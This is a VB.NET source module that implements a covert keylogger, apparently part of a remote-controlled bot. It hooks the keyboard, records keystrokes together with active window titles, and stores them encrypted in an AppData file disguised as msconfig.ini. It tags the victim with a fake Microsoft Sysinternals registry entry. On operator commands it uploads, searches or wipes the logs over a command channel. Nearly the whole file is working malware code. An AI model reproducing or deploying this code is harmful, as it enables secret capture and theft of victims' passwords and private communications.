Imports System.Threading
Imports System.IO

Module Logger
    Public WithEvents kHook As New KeyboardHook
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim LastWindowStr As String = Nothing
    Public KeyLogs As String = String.Empty
    Public KeyLogFile As String = String.Empty
    Public Sub StartLogger()
        Try
            Dim TopLels = GetSetting("Microsoft", "Sysinternals", "PROCID")
            If TopLels = String.Empty Then
                Dim r As New Random
                Call SaveSetting("Microsoft", "Sysinternals", "PROCID", r.Next(1000, 9999).ToString)
            End If
            KeyLogFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\msconfig.ini"
            If Not IO.File.Exists(KeyLogFile) Then
                IO.File.WriteAllText(KeyLogFile, String.Empty)
            End If
            AllowAccess(KeyLogFile)
            kHook.Register()
            Dim T As New Thread(AddressOf GetWindow)
            T.SetApartmentState(ApartmentState.STA)
            T.Start()
            Dim X As New Thread(AddressOf SaveLogs)
            X.SetApartmentState(ApartmentState.STA)
            X.Start()
        Catch : End Try
    End Sub
    Public Sub SendLogs()
        Try
            Dim x = AES_Decrypt(IO.File.ReadAllText(KeyLogFile))
            Dim TopLels = GetSetting("Microsoft", "Sysinternals", "PROCID")
            Send("KEYLOGS*" & Environment.UserName.ToString & "." & TopLels & "*" & x & vbNewLine & KeyLogs)
            TalktoChannel("Uploaded Keylogs Successfully!", String.Empty)
        Catch : End Try
    End Sub
    Public Sub DeleteLogs()
        Try
            If IO.File.Exists(KeyLogFile) Then IO.File.WriteAllText(KeyLogFile, String.Empty)
            TalktoChannel("Keylogs deleted Successfully!", String.Empty)
        Catch : End Try
    End Sub
    Public Sub SearchLogs(ByVal query As String)
        Try
            Dim x = AES_Decrypt(IO.File.ReadAllText(KeyLogFile))
            If x.Contains(query) Then
                Dim TopLels = GetSetting("Microsoft", "Sysinternals", "PROCID")
                Send("KEYLOGS*" & Environment.UserName.ToString & "." & TopLels & "*" & x & vbNewLine & KeyLogs)
                TalktoChannel("Found Query in Keylogs, Uploaded Successfully!", String.Empty)
            End If
        Catch : End Try
    End Sub
    Public Sub SaveLogs()
        Do
            Try
                If KeyLogs.Length > 150 Then
                    AllowAccess(KeyLogFile)
                    Dim x = AES_Decrypt(IO.File.ReadAllText(KeyLogFile))
                    IO.File.WriteAllText(KeyLogFile, AES_Encrypt(x & KeyLogs))
                    KeyLogs = String.Empty
                End If
            Catch : End Try
            Threading.Thread.Sleep(1000)
        Loop
    End Sub
    Public Sub GetWindow()
        Do
            Try
                Thread.Sleep(300)
                Dim lel = GetActiveWindowTitle()
                If LastWindowStr <> lel Then
                    If Not lel = String.Empty Then
                        LastWindowStr = GetActiveWindowTitle()
                        KeyLogs &= vbNewLine & vbNewLine & "[" & LastWindowStr & "]" & vbNewLine
                    End If
                End If
            Catch : End Try
        Loop
    End Sub
    Private Function GetActiveWindowTitle() As String
        Try
            Dim rawWindow As String = New String(Chr(0), 255)
            GetWindowText(GetForegroundWindow, rawWindow, 255)
            rawWindow = rawWindow.Substring(0, InStr(rawWindow, Chr(0)) - 1)
            If rawWindow.Trim(Chr(0)).Trim = Nothing Then
            Else
                Return rawWindow.Trim(Chr(0)).Trim
            End If
            Return Nothing
        Catch ex As Exception
            Return "N/A"
        End Try
    End Function
    Private Sub kHook_KeyDown(ByVal e As System.Windows.Forms.Keys) Handles kHook.KeyDown

        Select Case e
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Then
                    KeyLogs = KeyLogs & (e.ToString)
                ElseIf (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    KeyLogs = KeyLogs & (e.ToString)
                Else
                    Dim low As String = e.ToString
                    KeyLogs = KeyLogs & (low.ToLower)
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Dim str2 As String = e.ToString
                    str2 = str2.Replace("D1", "!")
                    str2 = str2.Replace("D2", "@")
                    str2 = str2.Replace("D3", "#")
                    str2 = str2.Replace("D4", "$")
                    str2 = str2.Replace("D5", "%")
                    str2 = str2.Replace("D6", "^")
                    str2 = str2.Replace("D7", "&")
                    str2 = str2.Replace("D8", "*")
                    str2 = str2.Replace("D9", "(")
                    str2 = str2.Replace("D0", ")")
                    KeyLogs = KeyLogs & (str2)
                Else
                    Dim str2 As String = e.ToString
                    str2 = str2.Replace("D", "")
                    KeyLogs = KeyLogs & (str2)
                End If
            Case 96 To 105
                Dim str2 As String = e.ToString
                str2 = str2.Replace("NumPad", "")
                KeyLogs = KeyLogs & (str2)
            Case 106 To 111
                Dim str2 As String = e.ToString
                str2 = str2.Replace("Divide", "/")
                str2 = str2.Replace("Multiply", "*")
                str2 = str2.Replace("Subtract", "-")
                str2 = str2.Replace("Add", "+")
                str2 = str2.Replace("Decimal", ".")
                KeyLogs = KeyLogs & (str2)
            Case 32
                KeyLogs = KeyLogs & (" ")
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Dim str2 As String = e.ToString
                    str2 = str2.Replace("OemMinus", "_")
                    str2 = str2.Replace("Oemplus", "+")
                    str2 = str2.Replace("OemOpenBrackets", "{")
                    str2 = str2.Replace("Oem6", "}")
                    str2 = str2.Replace("Oem5", "|")
                    str2 = str2.Replace("Oem1", ":")
                    str2 = str2.Replace("Oemcomma", "<")
                    str2 = str2.Replace("OemPeriod", ">")
                    str2 = str2.Replace("OemQuestion", "?")
                    str2 = str2.Replace("Oemtilde", "~")
                    KeyLogs = KeyLogs & (str2)
                Else
                    Dim str2 As String = e.ToString
                    str2 = str2.Replace("OemMinus", "-")
                    str2 = str2.Replace("Oemplus", "=")
                    str2 = str2.Replace("OemOpenBrackets", "[")
                    str2 = str2.Replace("Oem6", "]")
                    str2 = str2.Replace("Oem5", "\")
                    str2 = str2.Replace("Oem1", ";")
                    str2 = str2.Replace("Oem7", """")
                    str2 = str2.Replace("Oemcomma", ",")
                    str2 = str2.Replace("OemPeriod", ".")
                    str2 = str2.Replace("OemQuestion", "/")
                    str2 = str2.Replace("Oemtilde", "`")

                    KeyLogs = KeyLogs & (str2)
                End If

            Case Else
                Dim exceptions As String = "<Up><Right><Down><Left><LControlKey><RControlKey><NumLock><PageUp><Next><Home><End><Insert><Delete><Escape><LShiftKey><LWin><LMenu><Apps><RShiftKey><RMenu>"
                Dim LelS As String = e.ToString
                If Not exceptions.Contains(LelS) Then
                    If LelS.Contains("Oem7") Then LelS = LelS.Replace("Oem7", """")
                    If LelS.Contains("Back") Then ' Delete character
                        KeyLogs = KeyLogs.Substring(0, KeyLogs.Length - 1)
                    Else
                        If LelS.Contains("Tab") Then
                            KeyLogs += ControlChars.Tab
                        Else

                            If LelS.Contains("Return") Then ' Insert new line
                                KeyLogs = KeyLogs & vbNewLine
                            Else
                                '  KeyLogs = KeyLogs &("<" + LelS + ">")
                            End If
                        End If
                    End If
                End If
        End Select
    End Sub
End Module
